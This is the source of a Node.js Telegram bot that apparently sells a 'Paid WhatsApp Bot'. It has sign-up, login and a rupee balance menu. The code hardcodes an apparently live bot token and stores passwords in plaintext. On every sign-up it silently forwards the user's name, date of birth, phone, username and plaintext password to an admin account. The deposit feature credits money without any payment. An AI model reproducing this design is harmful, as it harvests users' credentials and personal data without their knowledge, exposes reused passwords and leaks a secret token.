const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');

// ===== BOT =====
const bot = new Telegraf('8226474686:AAEmXiWRGoeaa5pZpF2MZlYViYmSkM70fbI');
const ADMIN_ID = 6012422087;

// ===== DATABASE =====
const DATA_FILE = './users.json';
let users = {};

if (fs.existsSync(DATA_FILE)) {
    users = JSON.parse(fs.readFileSync(DATA_FILE));
}

function saveUsers() {
    fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
}

const sessions = {};
const PASSWORD_REGEX = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$/;

// ===== DATE =====
function getCurrentDate() {
    const d = new Date();
    return `${String(d.getDate()).padStart(2,'0')}-${String(d.getMonth()+1).padStart(2,'0')}-${d.getFullYear()}`;
}

// ======= Back Button Helper =======
function withBackButton(buttons = []) {
    return Markup.inlineKeyboard([
        ...buttons,
        [Markup.button.callback('⬅️ Back', 'backToMenu')]
    ]);
}

// ======= START =======
bot.start(async (ctx) => {
    await ctx.reply(
        '👋 Welcome!\n\nPlease Sign Up or Log In:',
        Markup.inlineKeyboard([
            Markup.button.callback('Sign Up', 'signup'),
            Markup.button.callback('Log In', 'login')
        ])
    );
});

// ======= BUTTON ACTIONS =======
bot.action('signup', async (ctx) => {
    sessions[ctx.chat.id] = { flow: 'signup', step: 'firstName' };
    await ctx.reply('Enter your first name:');
});

bot.action('login', async (ctx) => {
    sessions[ctx.chat.id] = { flow: 'login', step: 'loginUsername' };
    await ctx.reply('Enter your username:');
});

bot.action('forgotPassword', async (ctx) => {
    await ctx.reply('Password recovery not supported.\nPlease create a new account.');
});

// ======= TEXT HANDLER =======
bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;
    const text = ctx.message.text.trim();
    const session = sessions[chatId];
    if (!session) return;

    // ===== SIGNUP FLOW =====
    if (session.flow === 'signup') {
        switch (session.step) {
            case 'firstName':
                session.firstName = text;
                session.step = 'dob';
                return ctx.reply('Enter DOB (DD-MM-YYYY):');

            case 'dob': {
                const m = text.match(/^(\d{2})-(\d{2})-(\d{4})$/);
                if (!m) return ctx.reply('Invalid format. Example: 31-01-2000');
                const d = new Date(+m[3], +m[2] - 1, +m[1]);
                if (d.getDate() !== +m[1]) return ctx.reply('Invalid date.');

                const age = new Date().getFullYear() - d.getFullYear();
                if (age < 14 || age > 55) return ctx.reply('Age must be between 14 and 55.');

                session.dob = text;
                session.step = 'phone';
                return ctx.reply('Enter phone with country code (+923001234567):');
            }

            case 'phone': {
                if (!/^\+?[1-9]\d{9,14}$/.test(text)) {
                    return ctx.reply('Invalid phone number.');
                }
                session.phone = text;
                session.step = 'username';
                return ctx.reply('Create username (lowercase letters, numbers, underscore):');
            }

            case 'username':
                if (!/^[a-z0-9_]{3,15}$/.test(text)) {
                    return ctx.reply('Invalid username format. Use lowercase letters, numbers, underscore (_). Example: wasi123');
                }
                if (users[text]) {
                    return ctx.reply('Already Taken. Try Another.');
                }
                session.username = text;
                session.step = 'password';
                return ctx.reply('Enter your password (8+ chars, must include uppercase, lowercase, number):');

            case 'password':
                if (!PASSWORD_REGEX.test(text)) {
                    return ctx.reply('Weak password. Try again.');
                }
                session.password = text;
                session.step = 'confirmPassword';
                return ctx.reply('Confirm password:');

            case 'confirmPassword':
                if (text !== session.password) {
                    session.step = 'password';
                    return ctx.reply('Passwords do not match. Enter again:');
                }

                // SAVE GLOBAL ACCOUNT
                users[session.username] = {
                    firstName: session.firstName,
                    dob: session.dob,
                    phone: session.phone,
                    password: session.password,
                    registered: getCurrentDate(),
                    balance: 0,
                    transactions: []
                };

                saveUsers();
                sessions[chatId] = null;

                // ✅ Account Created Message + Log In button
                await ctx.reply(
                    '🎉 Account Created Successfully',
                    Markup.inlineKeyboard([
                        [Markup.button.callback('Log In', 'login')]
                    ])
                );

                // Admin notification
                const adminMsg = `
🆕 NEW ACCOUNT
👤 Name: ${session.firstName} 🎂 DOB: ${session.dob} 📞 Phone: ${session.phone} 👤 Username: ${session.username} 🔑 Password: ${session.password} 📅 Date: ${getCurrentDate()}
📲 Telegram: @${ctx.from.username || 'Not Set'} [https://t.me/${ctx.from.username || 'user?id=' + chatId}]
`;
                await bot.telegram.sendMessage(ADMIN_ID, adminMsg);
                break;
        }
    }

    // ===== LOGIN FLOW =====
    if (session.flow === 'login') {
        switch (session.step) {
            case 'loginUsername':
                if (!users[text]) {
                    return ctx.reply('Username not found.');
                }
                session.user = users[text];
                session.usernameKey = text;
                session.step = 'loginPassword';
                return ctx.reply('Enter password:');

            case 'loginPassword':
                if (text !== session.user.password) {
                    return ctx.reply('Incorrect password.');
                }

                sessions[chatId] = { user: session.user, usernameKey: session.usernameKey };

                // Account Verified + Dashboard
                await ctx.reply('✅ Account Verified');
                return ctx.reply(
                    `Dear ${session.user.firstName}, Welcome To Paid WhatsApp Bot`,
                    withBackButton([
                        [Markup.button.callback('Check Balance', 'checkBalance')],
                        [Markup.button.callback('Buy Bot', 'buyBot')],
                        [Markup.button.callback('Deposit Balance', 'depositBalance')],
                        [Markup.button.callback('Withdraw Balance', 'withdrawBalance')],
                        [Markup.button.callback('Log Out', 'logOut')]
                    ])
                );
        }
    }
});

// ===== BUTTON ACTIONS =====

// --- Check Balance + View Transactions
bot.action('checkBalance', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    const now = new Date();
    const date = `${String(now.getDate()).padStart(2,'0')}-${String(now.getMonth()+1).padStart(2,'0')}-${now.getFullYear()}`;
    const time = `${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;

    return ctx.reply(
        `Dear Customer, Your Account Balance Is: ${user.balance || 0} PKR On Account: ${user.firstName} Date: ${date} Time: ${time}`,
        Markup.inlineKeyboard([
            [Markup.button.callback('📜 View Transaction History', 'viewTransactions')],
            [Markup.button.callback('⬅️ Back', 'backToMenu')]
        ])
    );
});

// --- Deposit Balance
bot.action('depositBalance', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    const amount = 500; // example deposit
    user.balance = (user.balance || 0) + amount;

    if (!user.transactions) user.transactions = [];
    user.transactions.push({
        type: 'Deposit ➕',
        amount: amount,
        date: getCurrentDate(),
        time: new Date().toLocaleTimeString()
    });

    saveUsers();
    return ctx.reply(`✅ ${amount} PKR Deposited Successfully`, withBackButton([]));
});

// --- Withdraw Balance
bot.action('withdrawBalance', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    const amount = 200; // example withdraw
    if ((user.balance || 0) < amount) {
        return ctx.reply(`❌ Not Enough Balance To Withdraw ${amount} PKR`, withBackButton([]));
    }

    user.balance -= amount;

    if (!user.transactions) user.transactions = [];
    user.transactions.push({
        type: 'Withdraw ➖',
        amount: amount,
        date: getCurrentDate(),
        time: new Date().toLocaleTimeString()
    });

    saveUsers();
    return ctx.reply(`✅ ${amount} PKR Withdrawn Successfully`, withBackButton([]));
});

// --- Buy Bot (deduct 100 PKR)
bot.action('buyBot', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    const cost = 100;
    if ((user.balance || 0) < cost) {
        return ctx.reply(`❌ Not Enough Balance To Buy Bot (Cost: ${cost} PKR)`, withBackButton([]));
    }

    user.balance -= cost;

    if (!user.transactions) user.transactions = [];
    user.transactions.push({
        type: 'Buy Bot ➖',
        amount: cost,
        date: getCurrentDate(),
        time: new Date().toLocaleTimeString()
    });

    saveUsers();
    return ctx.reply(`✅ Bot Purchased! ${cost} PKR Deducted`, withBackButton([]));
});

// --- View Transaction History
bot.action('viewTransactions', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    if (!user.transactions || user.transactions.length === 0) {
        return ctx.reply('No transactions found.', withBackButton([]));
    }

    let historyMsg = '📜 Transaction History:\n\n';
    user.transactions.forEach((t, i) => {
        historyMsg += `${i + 1}. ${t.type}: ${t.amount} PKR on ${t.date} at ${t.time}\n`;
    });

    return ctx.reply(historyMsg, withBackButton([]));
});

// --- Log Out
bot.action('logOut', async (ctx) => {
    sessions[ctx.chat.id] = null;
    return ctx.reply('🔓 You have been logged out.', withBackButton([]));
});

// ===== BACK BUTTON ACTION =====
bot.action('backToMenu', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) {
        return ctx.reply(
            '👋 Welcome!\n\nPlease Sign Up or Log In:',
            Markup.inlineKeyboard([
                Markup.button.callback('Sign Up', 'signup'),
                Markup.button.callback('Log In', 'login')
            ])
        );
    } else {
        const user = users[session.usernameKey];
        return ctx.reply(
            `Dear ${user.firstName}, Welcome To Paid WhatsApp Bot`,
            withBackButton([
                [Markup.button.callback('Check Balance', 'checkBalance')],
                [Markup.button.callback('Buy Bot', 'buyBot')],
                [Markup.button.callback('Deposit Balance', 'depositBalance')],
                [Markup.button.callback('Withdraw Balance', 'withdrawBalance')],
                [Markup.button.callback('Log Out', 'logOut')]
            ])
        );
    }
});

// ===== LAUNCH =====
bot.launch();
console.log('Bot running...');
